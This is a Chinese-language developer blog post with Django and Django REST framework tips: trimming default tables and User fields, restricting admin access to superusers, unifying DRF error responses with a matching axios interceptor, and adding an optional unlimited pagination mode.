<h1 id="Django"><a href="#Django" class="headerlink" title="Django"></a><a name="django">Django</a></h1><h2 id="Remove-default-Table"><a href="#Remove-default-Table" class="headerlink" title="Remove default Table"></a><a name="remove-default-table">Remove default Table</a></h2><p>Django默认会在数据库中创建9张表,然而我们一般只使用Django作为后端接口来为前端提供服务,可能用不到这些默认生成的表.因此,为了节(技)省(术)资(洁)源(癖),我们可以禁用一些用不到的功能来避免在数据库中创建这些表.<br>Admin管理站点依赖的表:</p>
<ul>
<li>django_seesion</li>
<li>django_admin_log</li>
<li>django_content_type</li>
</ul>
<p>如果既不需要使用Admin管理站点功能,也不需要使用session做会话保持,还需从<code>settings.py</code>文件配置的<code>MIDDLEWARE</code>中删除<code>django.contrib.sessions.middleware.SessionMiddleware</code>,以及从<code>INSTALLED_APPS</code>中删除<code>django.contrib.sessions</code>.<br>将<code>User</code>中的<code>groups</code>和<code>user_permissions</code>设置为<code>None</code>可以阻止Django创建user_groups,user_user_permissions两张表</p>
<details open>
<summary>user.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> AbstractUser</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">AbstractUser</span>):</span><br><span class="line">    ...</span><br><span class="line">    groups = []</span><br><span class="line">    user_permissions = []</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

</details>

<p>⚠️在公司生产环境中,如果不使用migrate命令,可以手动删除以下四张表:</p>
<ul>
<li>auth_group</li>
<li>auth_permission</li>
<li>auth_group_permissions</li>
<li>django_migrations</li>
</ul>
<h2 id="Remove-is-staff"><a href="#Remove-is-staff" class="headerlink" title="Remove is_staff"></a><a name="remove-is_staff">Remove is_staff</a></h2><p>在Django中,默认使用<a href="https://docs.djangoproject.com/zh-hans/4.1/ref/contrib/auth/#django.contrib.auth.models.User.is_staff">is_staff</a>字段来控制用户能否登录管理站点.但在实际应用中,我们可能希望只使用<code>is_superuser</code>一个字段来同时控制用户的管理员权限和登录管理站点的权限,有以下两种实现方式.</p>
<h3 id="重写AdminSite"><a href="#重写AdminSite" class="headerlink" title="重写AdminSite"></a><a name="重写adminsite">重写AdminSite</a></h3><p>重写AdminSite中判断权限的逻辑,将其修改为判断<code>is_superuser</code>.参考<a href="https://docs.djangoproject.com/zh-hans/4.2/ref/contrib/admin/#overriding-the-default-admin-site">覆盖默认的管理站点 | Django 管理站点 | Django 文档</a>.</p>
<details open>
<summary>myproject/admin.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.core.handlers.wsgi <span class="keyword">import</span> WSGIRequest</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyAdminSite</span>(admin.AdminSite):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">has_permission</span>(<span class="params">self, request: WSGIRequest</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> request.user.is_active <span class="keyword">and</span> request.user.is_superuser</span><br></pre></td></tr></table></figure>

</details>

<h3 id="property"><a href="#property" class="headerlink" title="property"></a><a name="property">property</a></h3><p>除了重写<code>AdminSite</code>类,还可以借助<code>property</code>来实现.</p>
<details open>
<summary>user.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> AbstractUser</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">AbstractUser</span>):</span><br><span class="line">    ...</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_staff</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.is_superuser</span><br></pre></td></tr></table></figure>

</details>

<p>这种方式会有副作用,它会从Django的用户模型中移除<code>is_staff</code>字段.由于Django默认的<code>UserAdmin</code>还会展示<code>is_staff</code>字段,所以在Admin站点中访问用户页面时会报错,解决方案可参考下一节<a href="#remove-unsed-user-field">Remove unused User field</a>.</p>
<p>此外,Django默认的用户<code>Manager</code>类中的<code>create_user</code>和<code>create_superuser</code>方法内部会调用<code>_create_user</code>方法给<code>is_staff</code>字段设置默认值并写入数据库.但实际上数据库中并不存在<code>is_staff</code>字段,从而导致报错.因此,我们还需重写<code>UserManager</code>中的<code>_create_user</code>方法.</p>
<details>
<summary>models/user.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> UserManager <span class="keyword">as</span> BaseUserManager</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserManager</span>(BaseUserManager, SoftDeleteManagerMixin):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_create_user</span>(<span class="params">self, username, email, password, **extra_fields</span>):</span><br><span class="line">        extra_fields.pop(<span class="string">&quot;is_staff&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>()._create_user(username, email, password, **extra_fields)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">AbstractUser</span>):</span><br><span class="line">    objects = UserManager()</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

</details>


<div class="note warning">
  <p>Update 2023.09.03</p>
  遇到了玄学错误...<br/>
  还是老老实实用"重写AdminSite"吧....
</div>

<p>当通过将<code>User</code>中的<code>user_permissions</code>设置为<code>None</code>的方式来移除Django默认创建的表时.<br>如果一个已经登录过AdminSite站点的用户,从超级用户变为普通用户后,没有清理Cookie就去访问Admin站点会报错(预期效果如下图).原因是此时用户是<code>is_authenticated</code>的,从而绕过了<code>has_permission</code>的检查.对于普通用户,AdminSite类中的<code>get_app_list</code>方法内部调用的<code>has_module_permission</code>会尝试访问<code>user_user_permissions</code>从而导致报错;对于超级用户,<code>has_module_permission</code>则会直接返回为True.<br>可以通过重写AdminSite的<code>get_app_list</code>方法来解决.<br>    <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyAdminSite</span>(admin.AdminSite):</span><br><span class="line">		...</span><br><span class="line">      <span class="keyword">def</span> <span class="title function_">get_app_list</span>(<span class="params">self, request: WSGIRequest</span>):</span><br><span class="line">      <span class="keyword">if</span> request.user.is_superuser <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">          <span class="keyword">return</span> []</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">super</span>().get_app_list(request)</span><br></pre></td></tr></table></figure></p>
<img data-src="/posts/2053290144/admin.png" class="">

<h2 id="Remove-unused-User-field"><a href="#Remove-unused-User-field" class="headerlink" title="Remove unused User field"></a><a name="remove-unsed-user-field">Remove unused User field</a></h2><p>Django默认的用户模型中提供了一些附加字段,如<code>first_name</code>、<code>last_name</code>等.如果想移除这些不需要的字段,可以在<code>Model</code>中将它们设置为<code>None</code>,将这些字段从数据库中删除.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> AbstractUser</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">AbstractUser</span>):</span><br><span class="line">    ...</span><br><span class="line">    first_name = <span class="literal">None</span></span><br><span class="line">    last_name = <span class="literal">None</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>由于Django默认的<code>UserAdmin</code>可能会尝试展示已被移除的字段,导致报错,因此我们还需要自定义<code>UserAdmin</code>来覆盖原有逻辑,如<code>list_display</code>、<code>fieldsets</code>等.完整例子见<a href="#override-user-admin">UserAdmin</a></p>
<details open>
<summary>admin/user.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth.admin <span class="keyword">import</span> UserAdmin <span class="keyword">as</span> DjangoUserAdmin</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserAdmin</span>(<span class="title class_ inherited__">DjangoUserAdmin</span>):</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

</details>

<h2 id="Exception-Handle"><a href="#Exception-Handle" class="headerlink" title="Exception Handle"></a><a name="exception-handle">Exception Handle</a></h2><h3 id="BackEnd"><a href="#BackEnd" class="headerlink" title="BackEnd"></a><a name="exception-handle-backend">BackEnd</a></h3><h4 id="DRF中错误响应的结构"><a href="#DRF中错误响应的结构" class="headerlink" title="DRF中错误响应的结构"></a><a name="drf中错误响应的结构">DRF中错误响应的结构</a></h4><p>首先,我们先了解一下<a href="https://www.django-rest-framework.org/api-guide/exceptions/#exceptions">DRF中错误响应</a>的结构:</p>
<ul>
<li><p>对于大多数异常,DRF会返回一个形如<code>&#123;&quot;detail&quot;: &quot;Method &#39;DELETE&#39; not allowed.&quot;&#125;</code>的结构,一定包含<code>detail</code>键.</p>
</li>
<li><p>对于<code>ValidationError</code>,会返回一个以字段名称作为key,错误信息数组为value的结构;不属于某个特定字段的异常会使用setting中<code>NON_FIELD_ERRORS_KEY</code>的值(默认值为<code>non_field_errors·</code>)作为key.</p>
</li>
</ul>
<details open>
<summary>ValidationError Response</summary>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;field1&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;Error message 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;Error message 2&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;field2&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;Error message 3&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    ...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;non_field_errors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;Error message&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

</details>

<h4 id="ValidationError的使用"><a href="#ValidationError的使用" class="headerlink" title="ValidationError的使用"></a><a name="validationerror的使用">ValidationError的使用</a></h4><p><a href="https://www.django-rest-framework.org/api-guide/exceptions/#validationerror">ValidationError</a>(detail, code&#x3D;None)必须传入detail参数,detail可以是list或dict,也可以是嵌套结构.</p>
<p>我们可以通过serializers中的<code>validate_&lt;field_name&gt;</code>方法对特定的<a href="https://www.django-rest-framework.org/api-guide/serializers/#field-level-validation">某个字段进行验证</a>,raise异常时detail参数可以为str&#x2F;list,DRF最终会将其转换为<code>&#123;&#39;&lt;filed_name&gt;&#39;: [&#39;xxxx&#39;, &#39;yyyy&#39;]&#125;</code>的结构.</p>
<ul>
<li><code>ValidationError(&#39;Invalid &lt;filed_name&gt;.&#39;)</code> -&gt; <code>&#123;&#39;&lt;filed_name&gt;&#39;: [&#39;Invalid &lt;filed_name&gt;.&#39;]&#125;</code></li>
<li><code>ValidationError([&#39;Invalid msg 1&#39;,&#39;Invalid msg 2&#39;])</code> -&gt; <code>&#123;&#39;&lt;filed_name&gt;&#39;: [&#39;Invalid msg 1&#39;, &#39;Invalid msg 2&#39;]&#125;</code></li>
</ul>
<p>也可以在<code>validate</code>方法中对多个字段进行验证,此时raise异常时detail参数可以为str&#x2F;list&#x2F;dict.</p>
<ul>
<li><code>ValidationError(&#123;&#39;title&#39;: &#39;Invalid title&#39;&#125;)</code> -&gt; <code>&#123;&#39;title&#39;: [&#39;Invalid title&#39;]&#125;</code></li>
<li><code>ValidationError(&#123;&#39;title&#39;: [&#39;Invalid title&#39;,&#39;Invalid title 2&#39;]&#125;)</code> -&gt; <code>&#123;&#39;title&#39;: [&#39;Invalid title&#39;,&#39;Invalid title 2&#39;]&#125;</code></li>
<li><code>ValidationError(&#39;Error message1&#39;)</code> -&gt; <code>&#123;&#39;non_field_errors&#39;: [&#39;Error message1&#39;]&#125;</code></li>
<li><code>ValidationError([&#39;Error message1&#39;,&#39;Error message2&#39;])</code> -&gt; <code>&#123;&#39;non_field_errors&#39;: [&#39;Error message1&#39;, &#39;Error message2&#39;]&#125;</code></li>
</ul>
<h4 id="Custom-exception-handling"><a href="#Custom-exception-handling" class="headerlink" title="Custom exception handling"></a><a name="custom-exception-handling">Custom exception handling</a></h4><p>有时候我们不得不在serializers的create&#x2F;update中方法中raise ValidationError,此时DRF返回的结果为[&quot;Error in create&quot;],与上<br>述结构不符.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TestSerializer</span>(serializers.Serializer):</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">self, validated_data</span>):</span><br><span class="line">        ....</span><br><span class="line">        <span class="keyword">raise</span> serializers.ValidationError(<span class="string">&#x27;Error in create.&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>因此,我们还需要<a href="https://www.django-rest-framework.org/api-guide/exceptions/#custom-exception-handling">自定义异常处理</a>来处理这种情况,以此保证错误响应结构的统一.<br>以及对于非预期的异常进行统一处理,将错误信息存储于<code>detail</code>字段中,并返回500 Internal Server Error.</p>
<details>
<summary>lib.rest_framework.exception_handler.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> exceptions, serializers, status</span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> exception_handler</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_exception_handler</span>(<span class="params">exc, context</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(exc, exceptions.ValidationError):</span><br><span class="line">        exc = exceptions.ValidationError(detail=serializers.as_serializer_error(exc))</span><br><span class="line"></span><br><span class="line">    response = exception_handler(exc, context)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># request = context[&quot;request&quot;] # Logging or other things</span></span><br><span class="line">        <span class="keyword">if</span> settings.DEBUG <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(</span><br><span class="line">                &#123;<span class="string">&quot;detail&quot;</span>: <span class="built_in">str</span>(exc)&#125;, status=status.HTTP_500_INTERNAL_SERVER_ERROR</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(</span><br><span class="line">                &#123;<span class="string">&quot;detail&quot;</span>: <span class="string">&quot;Server Error (500)&quot;</span>&#125;, status=status.HTTP_500_INTERNAL_SERVER_ERROR,</span><br><span class="line">            )</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>

</details>

<h3 id="FrontEnd"><a href="#FrontEnd" class="headerlink" title="FrontEnd"></a><a name="exception-handle-frontend">FrontEnd</a></h3><p>前端的错误响应处理则主要分为三种类型:</p>
<ul>
<li>400 Bad Request<ul>
<li>优先从detail字段获取异常信息</li>
<li>detail字段为空时,用<code>NON_FIELD_ERRORS_KEY</code>(这里设置为errors)的值作为异常信息</li>
<li>否则,遍历错误响应数据,逐行展示每个字段的错误信息</li>
</ul>
</li>
<li>401 Unauthorized<ul>
<li>登录接口的请求直接reject</li>
<li>非登录接口的GET请求,提示用户重新登录</li>
<li>非登录接口的非GET请求,提示用户选择&quot;直接重新登录&quot;&#x2F;&quot;在新窗口登录&quot;,防止用户填写的表单数据丢失</li>
</ul>
</li>
<li>其他 -&gt; 直接依据HTTP状态码弹窗提示即可</li>
</ul>
<details>
<summary>request.js</summary>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">MessageBox</span>, <span class="title class_">Message</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> service = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">service.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(</span><br><span class="line">  <span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> response.<span class="property">data</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> status = error.<span class="property">response</span>.<span class="property">status</span>;</span><br><span class="line">    <span class="keyword">const</span> method = error.<span class="property">response</span>.<span class="property">config</span>.<span class="property">method</span>;</span><br><span class="line">    <span class="keyword">const</span> data = error.<span class="property">response</span>.<span class="property">data</span>;</span><br><span class="line">    <span class="keyword">const</span> &#123; errors = [], detail = <span class="literal">null</span> &#125; = data;</span><br><span class="line">    <span class="keyword">if</span> (status === <span class="number">400</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (detail !== <span class="literal">null</span>) &#123;</span><br><span class="line">        msg = detail;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (errors.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        msg = errors.<span class="title function_">join</span>(<span class="string">&#x27;&lt;br /&gt;&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> data === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">        msg = <span class="title class_">Object</span>.<span class="title function_">entries</span>(data)</span><br><span class="line">          .<span class="title function_">map</span>(<span class="function">(<span class="params">[key, value]</span>) =&gt;</span> <span class="string">`<span class="subst">$&#123;key&#125;</span>: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(value)&#125;</span>`</span>)</span><br><span class="line">          .<span class="title function_">join</span>(<span class="string">&#x27;&lt;br /&gt;&#x27;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status === <span class="number">401</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (error.<span class="property">response</span>.<span class="property">config</span>.<span class="property">url</span> !== <span class="string">&#x27;/account/login/&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.<span class="title function_">toUpperCase</span>() === <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">          <span class="title class_">MessageBox</span>.<span class="title function_">alert</span>(<span class="string">&#x27;由于用户长时间未操作,请重新登录!&#x27;</span>, <span class="string">&#x27;错误提示&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;warning&#x27;</span>,</span><br><span class="line">            <span class="attr">confirmButtonText</span>: <span class="string">&#x27;重新登录&#x27;</span>,</span><br><span class="line">          &#125;)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="comment">// 重新登录</span></span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">catch</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="comment">// Close</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="title class_">MessageBox</span>.<span class="title function_">alert</span>(</span><br><span class="line">            <span class="string">&#x27;登录状态已失效,您可在新窗口登录成功后返回当前页面&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;提示&#x27;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="attr">type</span>: <span class="string">&#x27;warning&#x27;</span>,</span><br><span class="line">              <span class="attr">distinguishCancelAndClose</span>: <span class="literal">true</span>,</span><br><span class="line">              <span class="attr">confirmButtonText</span>: <span class="string">&#x27;在新窗口登录&#x27;</span>,</span><br><span class="line">              <span class="attr">cancelButtonText</span>: <span class="string">&#x27;直接重新登录&#x27;</span>,</span><br><span class="line">              <span class="attr">showCancelButton</span>: <span class="literal">true</span>,</span><br><span class="line">            &#125;</span><br><span class="line">          )</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="comment">// 在新窗口登录</span></span><br><span class="line">              <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>, <span class="string">&#x27;_blank&#x27;</span>)</span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">catch</span>(<span class="function">(<span class="params">action</span>) =&gt;</span> &#123;</span><br><span class="line">              <span class="keyword">if</span> (action === <span class="string">&#x27;cancel&#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// 直接重新登录</span></span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Close</span></span><br><span class="line">                <span class="title class_">Message</span>(&#123;</span><br><span class="line">                  <span class="attr">message</span>: <span class="string">&#x27;取消!&#x27;</span>,</span><br><span class="line">                  <span class="attr">type</span>: <span class="string">&#x27;info&#x27;</span>,</span><br><span class="line">                &#125;);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status === <span class="number">403</span>) &#123;</span><br><span class="line">      msg = <span class="string">&#x27;你没有权限, 请联系管理员&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status === <span class="number">500</span>) &#123;</span><br><span class="line">      msg = <span class="string">&#x27;服务器内部错误&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status === <span class="number">502</span> || status === <span class="number">504</span>) &#123;</span><br><span class="line">      msg = <span class="string">&#x27;服务器开小差了&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      msg = <span class="string">`HTTP <span class="subst">$&#123;status&#125;</span>-错误<span class="subst">$&#123;detail ? <span class="string">&#x27;:&#x27;</span> + detail : <span class="string">&#x27;&#x27;</span>&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Message</span>(&#123;</span><br><span class="line">      <span class="attr">message</span>: msg,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">      <span class="attr">duration</span>: <span class="number">5</span> * <span class="number">1000</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

</details>

<h1 id="Django-REST-framework"><a href="#Django-REST-framework" class="headerlink" title="Django REST framework"></a><a name="django-rest-framework">Django REST framework</a></h1><h2 id="Pagination-unlimited"><a href="#Pagination-unlimited" class="headerlink" title="Pagination unlimited"></a><a name="pagination-unlimited">Pagination unlimited</a></h2><p>在一些场景中(如下拉框选项),我们可能需要一次性从分页接口获取所有数据,通常的做法是前端传递一个非常非常大的page_size.借助DRF（Django Rest Framework）中的自定义分页类,我们可以更优雅的实现无限制分页,具体步骤如下:</p>
<ul>
<li>创建新的分页类,并在<code>settings.py</code>中配置</li>
<li>后端通过特定的参数(如<code>pagination_unlimited</code>)来表示开启无限制分页,在需要开启的视图中声明为True</li>
<li>前端传递一个特定的参数(如<code>unlimited</code>)来表示无限制的分页,以获取所有数据</li>
<li><a href="https://www.django-rest-framework.org/api-guide/pagination/#using-your-custom-pagination-class">Pagination - Django REST framework</a></li>
</ul>
<details open>
<summary>Setting pagination class in settings.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    ...</span><br><span class="line">  <span class="string">&quot;DEFAULT_PAGINATION_CLASS&quot;</span>: <span class="string">&quot;lib.rest_framework.pagination.PageNumberPagination&quot;</span>,</span><br><span class="line">  <span class="string">&quot;PAGE_SIZE&quot;</span>: <span class="number">25</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</details>

<details>
<summary>lib/rest_framewor/pagination.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> pagination</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PageNumberPagination</span>(pagination.PageNumberPagination):</span><br><span class="line">    page_size_query_param = <span class="string">&quot;page_size&quot;</span></span><br><span class="line">    unlimited_query_param = <span class="string">&quot;unlimited&quot;</span></span><br><span class="line">    unlimited_query_description = (</span><br><span class="line">        <span class="string">&quot;A boolean value to indicate whether return all results.&quot;</span></span><br><span class="line">    )</span><br><span class="line">    unlimited_view_attribute = <span class="string">&quot;pagination_unlimited&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_schema_operation_parameters</span>(<span class="params">self, view</span>):</span><br><span class="line">        parameters = <span class="built_in">super</span>().get_schema_operation_parameters(view)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">getattr</span>(view, <span class="variable language_">self</span>.unlimited_view_attribute, <span class="literal">None</span>) <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            parameters.append(</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;name&quot;</span>: <span class="variable language_">self</span>.unlimited_query_param,</span><br><span class="line">                    <span class="string">&quot;required&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                    <span class="string">&quot;in&quot;</span>: <span class="string">&quot;query&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;description&quot;</span>: <span class="variable language_">self</span>.unlimited_query_description,</span><br><span class="line">                    <span class="string">&quot;schema&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;boolean&quot;</span>,</span><br><span class="line">                    &#125;,</span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_unlimited</span>(<span class="params">self, request</span>):</span><br><span class="line">        unlimited = request.query_params.get(<span class="variable language_">self</span>.unlimited_query_param, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> unlimited <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> unlimited.lower() <span class="keyword">in</span> (<span class="string">&quot;1&quot;</span>, <span class="string">&quot;true&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> unlimited.lower() <span class="keyword">in</span> (<span class="string">&quot;0&quot;</span>, <span class="string">&quot;false&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">paginate_queryset</span>(<span class="params">self, queryset, request, view=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.request = request</span><br><span class="line">        unlimited = <span class="variable language_">self</span>.get_unlimited(request)</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            unlimited <span class="keyword">is</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">and</span> <span class="built_in">getattr</span>(view, <span class="variable language_">self</span>.unlimited_view_attribute, <span class="literal">None</span>) <span class="keyword">is</span> <span class="literal">True</span></span><br><span class="line">        ):</span><br><span class="line">            page_size = queryset.count()</span><br><span class="line">            <span class="keyword">if</span> page_size == <span class="number">0</span>:</span><br><span class="line">              page_size = <span class="number">1</span></span><br><span class="line">            paginator = <span class="variable language_">self</span>.django_paginator_class(queryset, page_size)</span><br><span class="line">            <span class="variable language_">self</span>.page = paginator.page(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">list</span>(<span class="variable language_">self</span>.page)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().paginate_queryset(queryset, request, view)</span><br></pre></td></tr></table></figure>

</details>

<details>
<summary>views.py</summary>

